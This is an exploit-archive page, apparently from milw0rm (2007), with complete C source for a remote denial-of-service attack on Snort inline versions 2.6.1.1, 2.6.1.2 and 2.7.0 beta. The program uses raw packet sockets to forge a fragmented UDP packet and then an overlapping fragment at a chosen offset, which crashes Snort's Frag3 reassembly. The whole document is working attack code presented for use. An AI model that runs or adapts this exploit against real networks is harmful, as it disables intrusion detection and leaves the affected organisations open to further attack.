<html><head><title>Snort 2.6.1.1/2.6.1.2/2.7.0 (fragementation) Remote DoS Exploit</title></head><pre>/*********************************************************
 * DOS Snort Inline
 * Affected Versions: 2.6.1.1, 2.6.1.2, 2.7.0(beta)
 * Requirements : Frag3 Enabled, Inline, Linux, ip_conntrack disabled
 * Antimatt3r	
 * antimatter@gmail.com
 * Offset needs to be supplied that would cause reassembly for different snort
 * fragmentation reassembly policies. Since the first packet is hardcoded 70-74 offset
 * will trigger the segfault.
 ********************************************************/

#include &lt;stdio.h&gt;
#include &lt;errno.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;signal.h&gt;
#include &lt;unistd.h&gt;
#include &lt;net/if.h&gt;
#include &lt;net/ethernet.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/ioctl.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;netinet/udp.h&gt;
#include &lt;netinet/ip.h&gt;
#include &lt;netinet/if_ether.h&gt;
#include &lt;netpacket/packet.h&gt;


#define NOOP_FRAG_SLED 576
#define NOOP_SHORT 16 


struct addr {
  uint32_t ip;
  char mac[ETH_ALEN];
};

struct dev {
  uint32_t index;
  char name[IFNAMSIZ];
};

int mac_aton(char *, char *);
void usage(char *cmd) {
  fprintf(stderr, &quot;usage: %s &lt;device&gt; &lt;source_ip&gt;  &lt;src_mac&gt; &lt;dst_ip&gt;  &lt;dst_mac&gt;  &lt;offset&gt;\n&quot;, cmd);
}

int mac_aton(char *amac, char *nmac) {
  char c;
  int i;
  unsigned int val;

  i = 0;
  while ((*amac != '\0') &amp;&amp; (i &lt; ETH_ALEN)) {
    val = 0;
    c = *amac++;
    if (c &gt;= '0' &amp;&amp; c &lt;= '9') {
      val = c - '0';
    }
    else if (c &gt;= 'a' &amp;&amp; c &lt;= 'f') {
      val = c - 'a' + 10;
    }
    else if (c &gt;= 'A' &amp;&amp; c &lt;= 'F') {
      val = c - 'A' + 10;
    }
    else {
      errno = EINVAL;
      return -1;
    }
    val &lt;&lt;= 4;

    c = *amac;
    if (c &gt;= '0' &amp;&amp; c &lt;= '9') {
      val |= c - '0';
    }
    else if (c &gt;= 'a' &amp;&amp; c &lt;= 'f') {
      val |= c - 'a' + 10;
    }
    else if (c &gt;= 'A' &amp;&amp; c &lt;= 'F') {
      val |= c - 'A' + 10;
    }
    else if (c == ':' || c == '\0') {
      val &gt;&gt;= 4;
    }
    else {
      errno = EINVAL;
      return -1;
    }
    if (c != 0) {
      amac++;
    }
    *nmac++ = val &amp; 0xff;
    i++;

    /* We might get a semicolon here - not required. */
    if (*amac == ':') {
      amac++;
    }
  }
  return 0;
}


int in_cksum(u_short *addr, int len) {
int nleft = len;
u_short *w = addr;
int sum = 0;
u_short answer = 0;

  while (nleft &gt; 1) {
    sum += *w++;
    nleft -= 2;
  }

  if (nleft == 1) {
    *(u_char *)(&amp;answer) = *(u_char *)w;
    sum += answer;
  }

  sum = (sum &gt;&gt; 16) + (sum &amp; 0xffff);
  sum += (sum &gt;&gt; 16);
  answer = ~sum;

  return answer;
}

int send_morefrag_packet(int sock, struct dev *dev, struct addr *src, struct
addr *dst) {
  struct sockaddr_ll sll;
  struct ether_header *eth;
  struct iphdr *ip;
  struct udphdr *udp;
  u_char *payload;
  char buf[sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr)+ NOOP_FRAG_SLED];

  memset(&amp;sll, 0, sizeof(sll));
  sll.sll_family = PF_PACKET;
  sll.sll_ifindex = dev-&gt;index;
  sll.sll_halen = ETH_ALEN;
  memcpy(&amp;sll.sll_addr, dst-&gt;mac, ETH_ALEN);

  memset(buf, 0, sizeof(buf));
  eth = (struct ether_header *)buf;
  ip = (struct iphdr *)((char *)eth + sizeof(struct ether_header));
  udp = (struct udphdr *)((char *)ip + sizeof(struct iphdr));
  payload = (u_char *)((char *)udp + sizeof(struct udphdr));

  memset(payload,'\x90',NOOP_FRAG_SLED);


  udp-&gt;source = htons(1111);
  udp-&gt;dest = htons(1111);
  udp-&gt;len =  htons(sizeof(struct udphdr) + NOOP_FRAG_SLED) ;
  udp-&gt;check =0;


  ip-&gt;version = 4;
  ip-&gt;ihl = 5;
  ip-&gt;tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + NOOP_FRAG_SLED);
  ip-&gt;id = 31337;
  ip-&gt;ttl = 64;
  ip-&gt;frag_off = htons(0x2000);
  ip-&gt;protocol = IPPROTO_UDP;
  ip-&gt;saddr = src-&gt;ip;
  ip-&gt;daddr = dst-&gt;ip;
  ip-&gt;check = in_cksum((u_short *)ip, sizeof(struct iphdr));
  
  memcpy(eth-&gt;ether_shost, src-&gt;mac, ETH_ALEN);
  memcpy(eth-&gt;ether_dhost, dst-&gt;mac, ETH_ALEN);
  eth-&gt;ether_type = htons(ETH_P_IP);

  if(sendto(sock, buf, sizeof(buf), 0, (struct sockaddr *)&amp;sll, sizeof(sll)) == -1)
	printf (&quot;error %d %s\n&quot;,errno,strerror(errno));
  else
	printf(&quot;MF Packet Sent\n&quot;);
}

int send_overlap_packet(int sock, struct dev *dev, struct addr *src, struct
addr *dst,int offset) {
  struct sockaddr_ll sll;
  struct ether_header *eth;
  struct iphdr *ip;
  struct udphdr *udp;
  u_char *payload;
  char buf[sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr)+ NOOP_SHORT ];

  memset(&amp;sll, 0, sizeof(sll));
  sll.sll_family = PF_PACKET;
  sll.sll_ifindex = dev-&gt;index;
  sll.sll_halen = ETH_ALEN;
  memcpy(&amp;sll.sll_addr, dst-&gt;mac, ETH_ALEN);

  memset(buf, 0, sizeof(buf));
  eth = (struct ether_header *)buf;
  ip = (struct iphdr *)((char *)eth + sizeof(struct ether_header));
  udp = (struct udphdr *)((char *)ip + sizeof(struct iphdr));
  payload = (u_char *)((char *)udp + sizeof(struct udphdr));

  memset(payload,'\x90',NOOP_SHORT);

  udp-&gt;source = htons(1111);
  udp-&gt;dest = htons(1111);
  udp-&gt;len =  htons(sizeof(struct udphdr) + NOOP_SHORT) ;
  udp-&gt;check =0;

  ip-&gt;version = 4;
  ip-&gt;ihl = 5;
  ip-&gt;tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + NOOP_SHORT);
  ip-&gt;id = 31337;
  ip-&gt;frag_off = ntohs(offset);
  ip-&gt;ttl = 64;
  ip-&gt;protocol = IPPROTO_UDP;
  ip-&gt;saddr = src-&gt;ip;
  ip-&gt;daddr = dst-&gt;ip;
  ip-&gt;check = in_cksum((u_short *)ip, sizeof(struct iphdr));
  
  memcpy(eth-&gt;ether_shost, src-&gt;mac, ETH_ALEN);
  memcpy(eth-&gt;ether_dhost, dst-&gt;mac, ETH_ALEN);
  eth-&gt;ether_type = htons(ETH_P_IP);

  if(sendto(sock, buf, sizeof(buf), 0, (struct sockaddr *)&amp;sll, sizeof(sll)) == -1)
	printf (&quot;error %d %s\n&quot;,errno,strerror(errno));
  else
	printf(&quot;2nd Packet Sent\n&quot;);
}


int main(int argc, char *argv[]) {
  int sock = 0;
  struct dev dev;
  struct addr src, dst;
  int offset; //play with varying offsets

  if (argc &lt; 7) {
    usage(argv[0]);
    return -1;
  }

  memset(&amp;dev, 0, sizeof(dev));
  strncpy(dev.name, argv[1], IFNAMSIZ-1);
  if((dev.index = if_nametoindex(dev.name)) == 0) {
    perror(argv[1]);
    exit(-1);
  }

  memset(&amp;src, 0, sizeof(src));
  if (inet_aton(argv[2], (struct in_addr *)&amp;src.ip) == 0) {
    fprintf(stderr, &quot;%s: invalid src ip address\n&quot;, argv[2]);
    exit(-1);
  }

  if (mac_aton(argv[3], src.mac) &lt; 0) {
    fprintf(stderr, &quot;%s: invalid src hardware address\r\n&quot;, argv[3]);
    exit(-1);
  }

  memset(&amp;dst, 0, sizeof(dst));
  if (inet_aton(argv[4], (struct in_addr *)&amp;dst.ip) == 0) {
    fprintf(stderr, &quot;%s: invalid ip address\r\n&quot;, argv[2]);
    exit(-1);
  }

  if (mac_aton(argv[5], dst.mac) &lt; 0) {
    fprintf(stderr, &quot;%s: invalid hardware address\r\n&quot;, argv[3]);
    exit(-1);
  }
	
  offset = atoi(argv[6]);

  if ((sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) &lt; 0) {
     perror(&quot;socket&quot;);
     exit(-1);
  }

  if (send_morefrag_packet(sock, &amp;dev, &amp;src, &amp;dst) &lt; 0) {
    perror(&quot;send error &quot;);
    exit(-1);
  }
  
  if (send_overlap_packet(sock, &amp;dev, &amp;src, &amp;dst,offset) &lt; 0) {
    perror(&quot;send error&quot;);
    exit(-1);
  }

  close(sock);

  return 0;
}

// milw0rm.com [2007-03-08]</pre></html>